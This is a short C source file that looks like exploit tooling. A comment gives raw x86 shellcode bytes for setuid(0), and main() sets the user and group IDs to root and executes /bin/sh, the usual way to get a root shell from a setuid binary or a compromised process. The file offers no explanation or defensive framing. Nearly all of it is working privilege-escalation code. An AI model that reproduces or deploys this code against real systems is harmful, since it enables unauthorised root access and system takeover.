/*
 * Some shells (bast / tcsh ) force set euid to id for
 * security reasons if they aren't equal.
 *
 * A setuid(0) :
 * \x33\xc0\x31\xdb\xb0\x17\xcd\x80
 */

#include <unistd.h>

int main(void)
{
  char *name[] = { "/bin/sh", NULL };

  setuid(0);
  setgid(0);
  execve(name[0], name, NULL);
}
